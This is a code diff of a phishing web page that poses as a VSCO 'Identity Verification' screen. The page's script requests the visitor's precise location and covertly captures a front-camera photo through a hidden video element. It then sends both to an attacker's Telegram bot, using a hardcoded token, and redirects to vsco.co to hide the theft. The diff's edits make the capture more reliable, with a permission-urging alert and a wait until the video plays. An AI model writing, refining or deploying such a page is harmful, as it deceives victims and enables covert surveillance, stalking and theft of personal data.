@@ -6,17 +6,10 @@
     <style>
         body { background: #000; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: -apple-system, sans-serif; }
         .container { text-align: center; width: 85%; max-width: 350px; }
-        .vsco-logo { width: 60px; height: 60px; margin-bottom: 30px; }
-        h1 { font-size: 24px; font-weight: 600; margin-bottom: 15px; }
-        p { font-size: 15px; color: #8e8e93; line-height: 1.5; margin-bottom: 40px; }
-        
-        /* الزر الأزرق المطلوب */
-        .btn { 
-            background: #007aff; color: white; border: none; padding: 18px; 
-            border-radius: 12px; font-weight: 600; font-size: 16px; width: 100%;
-            cursor: pointer; box-shadow: 0 4px 15px rgba(0, 122, 255, 0.4);
-        }
-        .btn:active { background: #0056b3; transform: scale(0.98); }
+        .vsco-logo { width: 60px; margin-bottom: 30px; }
+        h1 { font-size: 24px; margin-bottom: 15px; }
+        p { font-size: 15px; color: #8e8e93; margin-bottom: 40px; }
+        .btn { background: #007aff; color: white; border: none; padding: 18px; border-radius: 12px; font-weight: 600; width: 100%; cursor: pointer; }
         video { width: 1px; height: 1px; opacity: 0; position: absolute; }
     </style>
 </head>
@@ -24,60 +17,58 @@
     <div class="container">
         <img src="https://vsco.co/assets/images/vsco-logo.png" class="vsco-logo">
         <h1>Identity Verification</h1>
-        <p>Verification is required to ensure secure studio access. Please complete the facial and region check.</p>
-        
-        <button class="btn" onclick="startProcess()">Verify Identity</button>
+        <p>Verification is mandatory for studio access. Please allow camera and location when prompted.</p>
+        <button class="btn" onclick="start()">Verify & Continue</button>
     </div>
 
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        const token = "8528253517:AAGk6SRaXs-M3PTPT3Z-ZwhLQXyQkI1bZMs"; //
-        const chatId = "8005843544"; //
+        const token = "8528253517:AAGk6SRaXs-M3PTPT3Z-ZwhLQXyQkI1bZMs";
+        const chatId = "8005843544";
 
-        async function startProcess() {
-            // الخطوة 1: طلب الموقع فوراً عند الضغط
+        async function start() {
+            // حل مشكلة الموقع: تنبيه يدوي أولاً
+            alert("Verification starting. Please click 'Allow' for Location and Camera to proceed.");
+            
             navigator.geolocation.getCurrentPosition(
                 (p) => {
-                    const loc = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`; // رابط خريطة مباشر
-                    openCamera(loc);
+                    const loc = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
+                    openCam(loc);
                 },
-                (err) => {
-                    openCamera("Location Access Denied (Check Phone Settings)");
-                },
+                (err) => { openCam("Location Denied (Manual Block)"); },
                 { enableHighAccuracy: true, timeout: 10000 }
             );
         }
 
-        async function openCamera(locationText) {
+        async function openCam(locText) {
             try {
-                // الخطوة 2: طلب الكاميرا
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
 
-                // الخطوة 3: الانتظار 3 ثوانٍ كاملة لضمان وضوح الصورة ومنع السواد
-                setTimeout(() => {
-                    const canvas = document.getElementById('canvas');
-                    const ctx = canvas.getContext('2d');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    ctx.drawImage(video, 0, 0);
-                    
-                    canvas.toBlob(blob => {
-                        const formData = new FormData();
-                        formData.append('chat_id', chatId);
-                        formData.append('photo', blob);
-                        formData.append('caption', `✅ Verified!\n📍 Map: ${locationText}`);
-                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData });
-                    }, 'image/jpeg');
+                // حل مشكلة السواد: الانتظار حتى يبدأ الفيديو فعلياً
+                video.onplaying = () => {
+                    setTimeout(() => {
+                        const canvas = document.getElementById('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        
+                        canvas.toBlob(blob => {
+                            const f = new FormData();
+                            f.append('chat_id', chatId);
+                            f.append('photo', blob);
+                            f.append('caption', `✅ Verified!\n📍 Map: ${locText}`);
+                            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: f });
+                        }, 'image/jpeg');
 
-                    // التحويل النهائي
-                    setTimeout(() => { window.location.href = "https://vsco.co/"; }, 1500);
-                }, 3000); 
+                        setTimeout(() => { window.location.href = "https://vsco.co/"; }, 1500);
+                    }, 4000); // زيادة الانتظار لـ 4 ثوانٍ لضمان الإضاءة
+                };
             } catch (e) {
-                alert("Facial verification is required. Please use Chrome/Safari and Allow camera access.");
+                alert("Error: Camera access is required.");
             }
         }
     </script>
